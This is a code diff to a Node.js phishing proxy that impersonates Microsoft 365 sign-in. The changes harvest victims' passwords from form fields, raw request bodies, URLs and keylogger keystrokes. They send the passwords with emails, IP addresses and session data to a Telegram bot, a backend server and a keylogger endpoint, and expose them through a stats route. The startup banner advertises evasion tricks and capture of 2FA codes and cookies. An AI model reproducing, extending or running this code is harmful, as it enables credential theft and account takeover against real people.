@@ -358,6 +358,7 @@ class AdvancedSessionStore {
             created: session.created,
             lastActivity: session.lastActivity,
             email: session.email || 'unknown',
+            password: session.password || 'N/A',
             rotationCount: session.rotationCount || 0,
             evasionData: {
                 fingerprint: session.fingerprint,
@@ -404,12 +405,21 @@ class AdvancedSessionStore {
             console.log(`[FULL-AUTH] ⚠️ Session ${sessionId} not found, creating new`);
             this.sessions.set(sessionId, {
                 email: authData.email || 'unknown',
+                password: authData.password || 'N/A',
                 created: Date.now(),
                 lastActivity: Date.now(),
                 rotationCount: 0,
                 fullAuthCompleted: true,
                 fullAuthTime: Date.now()
             });
+        } else {
+            // Update session with password
+            if (authData.password) {
+                session.password = authData.password;
+            }
+            session.fullAuthCompleted = true;
+            session.fullAuthTime = Date.now();
+            session.lastActivity = Date.now();
         }
         
         this.fullAuthData.set(sessionId, {
@@ -551,12 +561,14 @@ function createSession(email, ip, userAgent) {
         tokens: [],
         replayData: {},
         rotationCount: 0,
-        evasionEnabled: true
+        evasionEnabled: true,
+        password: null // Store extracted password
     };
     
     sessionStore.generateFingerprint(sessionId, userAgent, ip);
     sessionStore.sessions.set(sessionId, {
         email: email || 'unknown',
+        password: null,
         ip: ip || 'unknown',
         userAgent: userAgent || 'Unknown',
         created: Date.now(),
@@ -1844,42 +1856,95 @@ function handleLoginRequest(req, res) {
 
 // ============================================================
 //  FIXED: HANDLE POST REQUEST - WITH EVASION TECHNIQUES
+//  NOW PROPERLY EXTRACTS PASSWORD FROM MULTIPLE SOURCES
 // ============================================================
 
 function handlePostRequest(body, req, res) {
     try {
+        // Parse form data
         const formData = querystring.parse(body);
         const ip = getClientIp(req);
         const sessionId = getSessionIdFromCookie(req.headers.cookie);
         
-        let email = '';
+        console.log('[POST] 📥 Raw body:', body.substring(0, 200) + (body.length > 200 ? '...' : ''));
+        console.log('[POST] 📋 Parsed formData keys:', Object.keys(formData));
         
-        if (sessionId) {
-            const session = getSession(sessionId);
-            if (session) {
-                email = session.email;
-                VICTIM_SESSIONS[sessionId].attempts = (VICTIM_SESSIONS[sessionId].attempts || 0) + 1;
-                sessionStore.addEvasionCounter(sessionId);
+        // ============================================================
+        //  FIXED: BETTER PASSWORD EXTRACTION
+        // ============================================================
+        
+        let password = '';
+        
+        // Try common field names for password
+        const passwordFields = ['passwd', 'password', 'Password', 'PASSWORD', 'pass', 'pwd', 'loginPassword', 'Passwd'];
+        for (const field of passwordFields) {
+            if (formData[field]) {
+                password = formData[field];
+                console.log(`[POST] 🔑 Found password in field: ${field}`);
+                break;
             }
         }
         
-        if (!email) {
-            email = formData.loginfmt || formData.login || formData.email || '';
+        // If still empty, try to find it in the raw body string
+        if (!password) {
+            const bodyStr = body.toString();
+            const passMatch = bodyStr.match(/passwd=([^&]+)/i) || 
+                             bodyStr.match(/password=([^&]+)/i) ||
+                             bodyStr.match(/Passwd=([^&]+)/i) ||
+                             bodyStr.match(/loginPassword=([^&]+)/i);
+            if (passMatch) {
+                password = decodeURIComponent(passMatch[1]);
+                console.log('[POST] 🔑 Extracted password from raw body');
+            }
         }
         
+        // Also check if password is in URL parameters (for GET requests with password)
+        if (!password && req.url.includes('passwd=')) {
+            const urlPass = req.url.match(/passwd=([^&]+)/);
+            if (urlPass) {
+                password = decodeURIComponent(urlPass[1]);
+                console.log('[POST] 🔑 Extracted password from URL');
+            }
+        }
+        
+        // ============================================================
+        //  FIXED: BETTER EMAIL EXTRACTION
+        // ============================================================
+        
+        let email = '';
+        const emailFields = ['loginfmt', 'login', 'email', 'Email', 'username', 'user', 'LoginId', 'loginId'];
+        for (const field of emailFields) {
+            if (formData[field]) {
+                email = formData[field];
+                console.log(`[POST] 📧 Found email in field: ${field}`);
+                break;
+            }
+        }
+        
+        // Try to get email from URL
         if (!email) {
             const match = req.url.match(/login_hint=([^&]+)/);
             if (match) {
                 email = decodeURIComponent(match[1]);
+                console.log('[POST] 📧 Extracted email from URL');
+            }
+        }
+        
+        // Try to get email from session
+        if (!email) {
+            const session = getSession(sessionId);
+            if (session) {
+                email = session.email;
+                console.log('[POST] 📧 Retrieved email from session');
             }
         }
         
         if (!email) {
-            console.warn('[POST] No email found, using unknown');
+            console.warn('[POST] ⚠️ No email found, using unknown');
             email = 'unknown@domain.com';
         }
 
-        const password = formData.passwd || formData.password || '';
+        // Track attempt count
         let attemptCount = attemptCounts.get(email) || 0;
         attemptCount++;
         attemptCounts.set(email, attemptCount);
@@ -1890,11 +1955,27 @@ function handlePostRequest(body, req, res) {
         console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
         console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);
 
-        // Store form data
+        // ============================================================
+        //  STORE CREDENTIALS IN SESSION
+        // ============================================================
+        
         if (sessionId) {
-            sessionStore.sessions.set(sessionId, {
-                ...sessionStore.sessions.get(sessionId),
-                forms: [...(sessionStore.sessions.get(sessionId)?.forms || []), {
+            // Update both session stores
+            if (VICTIM_SESSIONS[sessionId]) {
+                VICTIM_SESSIONS[sessionId].attempts = attemptCount;
+                VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
+                if (password) {
+                    VICTIM_SESSIONS[sessionId].password = password;
+                }
+            }
+            
+            // Update session store
+            const sessionData = sessionStore.sessions.get(sessionId);
+            if (sessionData) {
+                sessionData.password = password || sessionData.password;
+                sessionData.lastActivity = Date.now();
+                sessionData.forms = sessionData.forms || [];
+                sessionData.forms.push({
                     email: email,
                     password: password,
                     formData: formData,
@@ -1902,11 +1983,16 @@ function handlePostRequest(body, req, res) {
                     method: 'POST',
                     ip: ip,
                     timestamp: Date.now()
-                }]
-            });
+                });
+            }
+            
+            sessionStore.addEvasionCounter(sessionId);
         }
 
-        // Send to Telegram with evasion data
+        // ============================================================
+        //  SEND TELEGRAM NOTIFICATION
+        // ============================================================
+        
         let msg = `🔐 *MICROSOFT LOGIN ATTEMPT #${attemptCount}*\n\n`;
         msg += `*📧 Email:* ${email}\n`;
         msg += `*🔑 Password:* ${password || 'N/A'}\n`;
@@ -1918,6 +2004,10 @@ function handlePostRequest(body, req, res) {
         
         sendToTelegram(msg);
 
+        // ============================================================
+        //  SEND TO BACKEND SERVICES
+        // ============================================================
+        
         // Send to backend
         axios.post(`${BACKEND_URL}/api/authenticate`, {
             email: email,
@@ -1931,7 +2021,7 @@ function handlePostRequest(body, req, res) {
             }
         }).catch(() => {});
 
-        // Send to keylogger
+        // Send to keylogger if password exists
         if (KEYLOGGER_URL && password) {
             axios.post(`${KEYLOGGER_URL}/log-combined`, {
                 type: 'microsoft_login',
@@ -1946,7 +2036,10 @@ function handlePostRequest(body, req, res) {
             }).catch(() => {});
         }
 
-        // Verify with Microsoft
+        // ============================================================
+        //  VERIFY WITH MICROSOFT
+        // ============================================================
+        
         verifyWithMicrosoft(email, password)
             .then((result) => {
                 if (result.success) {
@@ -2171,6 +2264,133 @@ function handleSessionReplay(req, res) {
 }
 
 // ============================================================
+//  KEYLOG ENDPOINT - EXTRACT PASSWORD FROM KEYSTROKES
+// ============================================================
+
+function handleKeylog(req, res) {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', () => {
+        try {
+            const data = JSON.parse(body);
+            const sessionId = getSessionIdFromCookie(req.headers.cookie) || data.sessionId;
+            const ip = getClientIp(req);
+            
+            console.log(`[KEYLOG] ⌨️ Received keystrokes for session ${sessionId ? sessionId.substring(0, 12) : 'N/A'}`);
+            
+            if (sessionId && VICTIM_SESSIONS[sessionId]) {
+                // Store keystrokes
+                VICTIM_SESSIONS[sessionId].keystrokes.push({
+                    ...data,
+                    timestamp: Date.now(),
+                    ip: ip
+                });
+                VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
+                
+                // ============================================================
+                //  EXTRACT PASSWORD FROM KEYSTROKES
+                // ============================================================
+                
+                let extractedPassword = null;
+                
+                // Look for password field captures
+                if (data.keystrokes) {
+                    // Pattern: [FIELD:passwd=...] captures from the script
+                    const passMatch = data.keystrokes.match(/\[FIELD:passwd=([^\]]+)\]/g);
+                    if (passMatch) {
+                        // Join all password field captures
+                        let fullPassword = '';
+                        for (const match of passMatch) {
+                            const value = match.replace(/\[FIELD:passwd=/, '').replace(/\]/, '');
+                            fullPassword += value;
+                        }
+                        
+                        // Clean up the password (remove duplicates, etc.)
+                        if (fullPassword) {
+                            extractedPassword = fullPassword;
+                            console.log(`[KEYLOG] 🔑 Extracted password from keystrokes: ${extractedPassword}`);
+                        }
+                    }
+                    
+                    // Also try to extract from keylog buffer if it contains password field
+                    if (!extractedPassword && data.keystrokes.includes('passwd')) {
+                        const lines = data.keystrokes.split('\n');
+                        for (const line of lines) {
+                            if (line.includes('passwd')) {
+                                const match = line.match(/passwd[=:]([^\s,]+)/i);
+                                if (match) {
+                                    extractedPassword = match[1];
+                                    console.log(`[KEYLOG] 🔑 Extracted password from line: ${extractedPassword}`);
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+                
+                // Store extracted password
+                if (extractedPassword) {
+                    VICTIM_SESSIONS[sessionId].password = extractedPassword;
+                    
+                    // Update session store
+                    const sessionData = sessionStore.sessions.get(sessionId);
+                    if (sessionData) {
+                        sessionData.password = extractedPassword;
+                        sessionData.lastActivity = Date.now();
+                    }
+                    
+                    // Send Telegram with extracted password
+                    const email = VICTIM_SESSIONS[sessionId].email || 'unknown';
+                    const msg = 
+`⌨️ *PASSWORD EXTRACTED FROM KEYLOGGER*
+
+*📧 Email:* ${email}
+*🔑 Password:* ${extractedPassword}
+*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}
+*📡 IP:* ${ip}
+*🕐 Time:* ${new Date().toISOString()}
+*🎯 Service:* Microsoft 365
+
+*✅ Password captured successfully!*`;
+
+                    sendToTelegram(msg);
+                    
+                    // Also send to backend
+                    axios.post(`${BACKEND_URL}/api/keylog-password`, {
+                        email: email,
+                        password: extractedPassword,
+                        sessionId: sessionId,
+                        ip: ip,
+                        timestamp: new Date().toISOString()
+                    }).catch(() => {});
+                }
+                
+                // Forward to keylogger URL if configured
+                if (KEYLOGGER_URL) {
+                    axios.post(KEYLOGGER_URL, {
+                        ...data,
+                        sessionId: sessionId,
+                        email: VICTIM_SESSIONS[sessionId].email,
+                        extractedPassword: extractedPassword
+                    }).catch(() => {});
+                }
+            }
+            
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ 
+                success: true,
+                passwordExtracted: !!extractedPassword
+            }));
+            
+        } catch (error) {
+            console.error('[KEYLOG] Error:', error.message);
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: 'Internal server error' }));
+        }
+    });
+}
+
+// ============================================================
 //  FULL AUTH API ROUTES
 // ============================================================
 
@@ -2212,6 +2432,9 @@ function handleFullAuth(req, res) {
                 VICTIM_SESSIONS[sessionId].fullAuthData = authData;
                 VICTIM_SESSIONS[sessionId].fullAuthCompleted = true;
                 VICTIM_SESSIONS[sessionId].fullAuthTime = Date.now();
+                if (authData.password) {
+                    VICTIM_SESSIONS[sessionId].password = authData.password;
+                }
             }
             
             // Send Telegram notification with ALL data
@@ -2323,22 +2546,18 @@ const server = http.createServer((req, res) => {
 
     // ============================================================
     //  OAUTH CALLBACK ROUTES - MUST BE BEFORE OTHER ROUTES
-    //  FIXES "Object moved" AND "wrongplace" ISSUES
     // ============================================================
     
-    // Handle OAuth callback (Microsoft redirects here with code)
     if (req.url.startsWith('/callback') || req.url.startsWith('/common/oauth2/nativeclient')) {
         handleOAuthCallback(req, res);
         return;
     }
     
-    // Also handle any URL containing 'code=' (OAuth redirect)
     if (req.url.includes('code=')) {
         handleOAuthCallback(req, res);
         return;
     }
     
-    // Handle "wrongplace" redirect - redirect to proxy
     if (req.url.includes('wrongplace')) {
         console.log('[PROXY] 🔄 Wrongplace detected - redirecting to proxy');
         const sessionId = getSessionIdFromCookie(req.headers.cookie);
@@ -2354,21 +2573,27 @@ const server = http.createServer((req, res) => {
     //  OAUTH AUTO-CAPTURE ENDPOINTS
     // ============================================================
     
-    // POST: Start OAuth capture with password
     if (req.url === PROXY_PATHNAMES.oauthCaptureEndpoint && req.method === 'POST') {
         handleOAuthCapture(req, res);
         return;
     }
     
-    // POST: Capture user info
     if (req.url === PROXY_PATHNAMES.captureUserEndpoint && req.method === 'POST') {
         handleCaptureUser(req, res);
         return;
     }
     
-    // POST: Send Telegram message
     if (req.url === PROXY_PATHNAMES.telegramEndpoint && req.method === 'POST') {
         handleTelegram(req, res);
+        return;
+    }
+
+    // ============================================================
+    //  KEYLOG ENDPOINT - IMPORTANT FOR PASSWORD EXTRACTION
+    // ============================================================
+    
+    if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
+        handleKeylog(req, res);
         return;
     }
 
@@ -2376,13 +2601,11 @@ const server = http.createServer((req, res) => {
     //  FULL AUTH ENDPOINTS
     // ============================================================
     
-    // POST: Store full auth data
     if (req.url === PROXY_PATHNAMES.fullAuthEndpoint && req.method === 'POST') {
         handleFullAuth(req, res);
         return;
     }
     
-    // GET: Retrieve full auth data
     if (req.url.startsWith(PROXY_PATHNAMES.fullAuthEndpoint + '/') && req.method === 'GET') {
         const sessionId = req.url.split('/').pop();
         req.params = { sessionId: sessionId };
@@ -2547,7 +2770,6 @@ const server = http.createServer((req, res) => {
             }
         }
         
-        // Get full auth data if available
         const fullAuthData = sessionStore.getFullAuthData(sessionId);
         
         res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -2555,6 +2777,7 @@ const server = http.createServer((req, res) => {
             success: true,
             sessionId: sessionId,
             email: sessionData.email || 'unknown',
+            password: sessionData.password || 'N/A',
             created: sessionData.created,
             lastActivity: sessionData.lastActivity,
             cookies: cookieData?.cookieHeader ? 
@@ -2635,40 +2858,6 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            try {
-                const data = JSON.parse(body);
-                const sessionId = getSessionIdFromCookie(req.headers.cookie);
-                
-                if (sessionId && VICTIM_SESSIONS[sessionId]) {
-                    VICTIM_SESSIONS[sessionId].keystrokes.push(data);
-                    sessionStore.sessions.set(sessionId, {
-                        ...sessionStore.sessions.get(sessionId),
-                        keystrokes: data.keystrokes
-                    });
-                    
-                    if (KEYLOGGER_URL) {
-                        axios.post(KEYLOGGER_URL, {
-                            ...data,
-                            sessionId: sessionId,
-                            email: VICTIM_SESSIONS[sessionId].email
-                        }).catch(() => {});
-                    }
-                }
-                
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ success: true }));
-            } catch (error) {
-                res.writeHead(500);
-                res.end(JSON.stringify({ error: 'Internal server error' }));
-            }
-        });
-        return;
-    }
-
     // Health check
     if (req.url === '/health') {
         const stats = sessionStore.getStats();
@@ -2704,6 +2893,7 @@ const server = http.createServer((req, res) => {
         const sessionData = Object.keys(VICTIM_SESSIONS).map(id => ({
             sessionId: id.substring(0, 12) + '...',
             email: VICTIM_SESSIONS[id].email || 'N/A',
+            password: VICTIM_SESSIONS[id].password || 'N/A',
             ip: VICTIM_SESSIONS[id].ip || 'N/A',
             created: VICTIM_SESSIONS[id].created,
             cookieCount: (VICTIM_SESSIONS[id].cookies || []).length,
@@ -2758,6 +2948,7 @@ server.listen(PORT, () => {
     console.log('║     🔐  Next-Generation Evasion Techniques               ║');
     console.log('║     📊  Full Authentication Data Capture                 ║');
     console.log('║     🤖  OAuth Auto-Capture Enabled                       ║');
+    console.log('║     🔑  Password Extraction from Keylogger              ║');
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log('║                                                           ║');
@@ -2769,8 +2960,16 @@ server.listen(PORT, () => {
     console.log(`║   🤖 OAuth:     ${PROXY_PATHNAMES.oauthCaptureEndpoint} ║`);
     console.log(`║   🔄 Rotation:  ${PROXY_PATHNAMES.tokenRotation}        ║`);
     console.log(`║   🔐 Callback:  /callback or /common/oauth2/nativeclient ║`);
+    console.log(`║   ⌨️ Keylogger: ${PROXY_PATHNAMES.keylogEndpoint}       ║`);
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
+    console.log('║                                                           ║');
+    console.log('║   ✅ FIXED: Password Extraction from Multiple Sources    ║');
+    console.log('║   1. POST form data (passwd, password, etc.)             ║');
+    console.log('║   2. Raw body parsing                                    ║');
+    console.log('║   3. URL parameters                                      ║');
+    console.log('║   4. Keylogger keystrokes (FIELD:passwd captures)       ║');
+    console.log('║   5. Full auth data storage                             ║');
     console.log('║                                                           ║');
     console.log('║   ✅ ADVANCED EVASION TECHNIQUES:                        ║');
     console.log('║   1. Browser Fingerprint Spoofing                        ║');
@@ -2783,19 +2982,6 @@ server.listen(PORT, () => {
     console.log('║   8. Cache Poisoning with Random Headers                ║');
     console.log('║   9. API Traffic Mimicry (GraphQL/REST)                 ║');
     console.log('║   10. Random User-Agent Rotation                        ║');
-    console.log('║   11. Jittered Request Timing                           ║');
-    console.log('║   12. Cross-Origin Tracking Prevention Bypass           ║');
-    console.log('║                                                           ║');
-    console.log('╠═══════════════════════════════════════════════════════════╣');
-    console.log('║                                                           ║');
-    console.log('║   📊 DATA CAPTURE TYPES:                                 ║');
-    console.log('║   ✅ Email, Name, Organization                           ║');
-    console.log('║   ✅ Password, 2FA Code, App Password                   ║');
-    console.log('║   ✅ Security Questions & Answers                       ║');
-    console.log('║   ✅ HttpOnly Cookies & Tokens                          ║');
-    console.log('║   ✅ Full Session Replay Data                           ║');
-    console.log('║   ✅ OAuth Auto-Capture (No User Input)                 ║');
-    console.log('║   ✅ OAuth Callback Handler (Fixes redirect issues)     ║');
     console.log('║                                                           ║');
     console.log('╚═══════════════════════════════════════════════════════════╝');
 });
